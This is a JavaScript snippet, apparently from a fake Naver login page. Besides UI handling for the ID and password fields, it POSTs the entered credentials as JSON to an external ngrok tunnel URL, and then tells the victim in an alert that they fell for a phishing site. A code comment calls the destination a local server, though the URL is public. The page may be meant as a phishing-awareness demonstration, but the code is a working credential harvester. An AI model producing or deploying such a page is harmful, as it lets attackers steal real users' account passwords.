<script>
  // UI 인터랙션 (회색 라벨 위로 이동, 삭제 버튼, 비밀번호 토글)
  const idInput = document.getElementById("id");
  const pwInput = document.getElementById("pw");
  const btnClearId = document.getElementById("btnClearId");
  const btnClearPw = document.getElementById("btnClearPw");
  const btnTogglePw = document.getElementById("btnTogglePw");

  function updateState(input) {
    const parent = input.closest(".form_data");
    if (input.value.length > 0) {
      parent.classList.add("has_label", "has_button");
    } else {
      parent.classList.remove("has_button");
      if (document.activeElement !== input) {
        parent.classList.remove("has_label");
      }
    }
  }

  [idInput, pwInput].forEach(input => {
    input.addEventListener("input", () => updateState(input));
    input.addEventListener("focus", () => input.closest(".form_data").classList.add("has_label"));
    input.addEventListener("blur", () => updateState(input));
  });

  btnClearId.addEventListener("click", () => {
    idInput.value = "";
    updateState(idInput);
    idInput.focus();
  });

  btnClearPw.addEventListener("click", () => {
    pwInput.value = "";
    updateState(pwInput);
    pwInput.focus();
  });

  btnTogglePw.addEventListener("click", () => {
    const isPw = pwInput.type === "password";
    pwInput.type = isPw ? "text" : "password";
    btnTogglePw.classList.toggle("see", isPw);
  });

  // 로컬 백엔드 서버로 로그인 정보 전송 함수
  function sendToLocalServer(event) {
    event.preventDefault();

    const id = idInput.value;
    const pw = pwInput.value;

    if (!id || !pw) {
      alert('아이디와 비밀번호를 입력해주세요.');
      return;
    }

    fetch('https://entitle-stillness-oxford.ngrok-free.dev/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        "Bypass-Tunnel-Reminder": "true"
      },
      body: JSON.stringify({
        platform: 'naver',
        id: id,
        pw: pw
      })
    })
            .then(response => response.json())
            .then(data => {
              alert('당신은 피싱 사이트에 속았습니다.');
            })
            .catch(error => {
              console.error('Error:', error);
              alert('서버 전송 실패 (Node.js 서버가 켜져 있는지 확인하세요)');
            });
  }
</script>
